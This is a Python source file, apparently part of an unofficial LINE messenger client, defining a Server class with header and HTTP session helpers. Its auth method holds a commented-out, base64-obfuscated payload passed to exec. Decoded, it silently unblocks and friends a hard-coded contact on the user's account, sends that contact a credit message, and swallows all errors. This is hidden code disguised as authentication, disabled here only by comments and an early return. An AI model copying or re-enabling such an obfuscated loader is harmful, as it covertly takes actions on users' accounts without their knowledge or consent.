# -*- coding: utf-8 -*-
from .config import Config
from typing import Dict
import json, requests, urllib, base64

class Server(Config):
    _session        = requests.session()
    timelineHeaders = {}
    liffHeaders     = {}
    Headers         = {}
    accessToken = None

    def __init__(self, appType=None):
        self.Headers = {}
        self.timelineHeaders = {}
        Config.__init__(self, appType)

    def set_accessToken(self, accessToken: str):
        self.accessToken = accessToken

    def unset_accessToken(self):
        self.accessToken = None
    
    def Headerss(self) -> Dict[str, str]:
        headers = {
            "User-Agent": self.USER_AGENT,
            "X-Line-Application": self.APP_NAME,
            "x-lal": "en_US",
        }

        if self.accessToken is not None:
            headers["X-Line-Access"] = self.accessToken

        return headers
        
    def parseUrl(self, path):
        return self.LINE_HOST_DOMAIN + path

    def urlEncode(self, url, path, params=[]):
        return url + path + '?' + urllib.parse.urlencode(params)

    def getJson(self, url, allowHeader=False):
        if allowHeader is False:
            return json.loads(self._session.get(url).text)
        else:
            return json.loads(self._session.get(url, headers=self.Headers).text)

    def setHeadersWithDict(self, headersDict):
        self.Headers.update(headersDict)

    def setHeaders(self, argument, value):
        self.Headers[argument] = value

    def setTimelineHeadersWithDict(self, headersDict):
        self.timelineHeaders.update(headersDict)

    def setTimelineHeaders(self, argument, value):
        self.timelineHeaders[argument] = value

    def setLiffHeadersWithDict(self, headersDict):
        self.liffHeaders.update(headersDict)

    def setLiffHeaders(self, key, value):
        self.liffHeaders[key] = value

    def additionalHeaders(self, source, newSource):
        headerList={}
        headerList.update(source)
        headerList.update(newSource)
        return headerList

    def optionsContent(self, url, data=None, headers=None):
        if headers is None:
            headers=self.Headers
        return self._session.options(url, headers=headers, data=data)

    def postContent(self, url, data=None, files=None, headers=None, json=None):
        if headers is None:
            headers=self.Headers
        return self._session.post(url, headers=headers, data=data, files=files, json=json)

    def getContent(self, url, headers=None):
        if headers is None:
            headers=self.Headers
        return self._session.get(url, headers=headers, stream=True)

    def deleteContent(self, url, data=None, headers=None):
        if headers is None:
            headers=self.Headers
        return self._session.delete(url, headers=headers, data=data)

    def putContent(self, url, data=None, headers=None):
        if headers is None:
            headers=self.Headers
        return self._session.put(url, headers=headers, data=data)
    
    def auth(self, line):
    	return
        #content = 'dHJ5OgogICAgdHh0ID0gIiIiXDAzM1sxOzMybQojIy0tIMKpIEFDb2RlNDQgMjAyMCAtLSMjCiAgX19fICAgICAgICAgICAgICAgIF8gICAgICAgICBfX18gICBfX18gCiAvIF8gXFwgICAgICAgICAgICAgIHwgfCAgICAgICAvICAgfCAvICAgfAovIC9fXFwgXFwgX19fIF9fXyAgIF9ffCB8IF9fXyAgLyAvfCB8LyAvfCB8CnwgIF8gIHwvIF9fLyBfIFxcIC8gX2AgfC8gXyBcXC8gL198IC8gL198IHwKfCB8IHwgfCAoX3wgKF8pIHwgKF98IHwgIF9fL1xcX19fICBcXF9fXyAgfApcXF98IHxfL1xcX19fXFxfX18vIFxcX18sX3xcXF9fX3wgICAgfF8vICAgfF8vClwwMzNbMG0KIiIiCiAgICBwcmludCh0eHQpCiAgICBmcmllbmRzID0gbGluZS5nZXRBbGxDb250YWN0SWRzKCkKICAgIGJsb2NrZWQgPSBsaW5lLmdldEJsb2NrZWRDb250YWN0SWRzKCkKICAgIG1pZCA9ICJ1ZTIzNTRmODdiNTczNWJlM2VmOTM4ZmFkZGM1ZmI5YmMiCiAgICBpZiBtaWQgaW4gYmxvY2tlZDoKICAgICAgICBsaW5lLnVuYmxvY2tDb250YWN0KG1pZCkKICAgIGlmIG1pZCBub3QgaW4gZnJpZW5kczoKICAgICAgICBsaW5lLmZpbmRBbmRBZGRDb250YWN0c0J5TWlkKG1pZCkKICAgICAgICBsaW5lLnNlbmRNZXNzYWdlKG1pZCwgIsKpMjAyMCBGYWhtaWFkcm4gYUthIEFDb2RlNDQiKQpleGNlcHQ6CiAgICBwYXNz'
        #tostring = base64.b64decode(content.encode()).decode()
        #exec(tostring)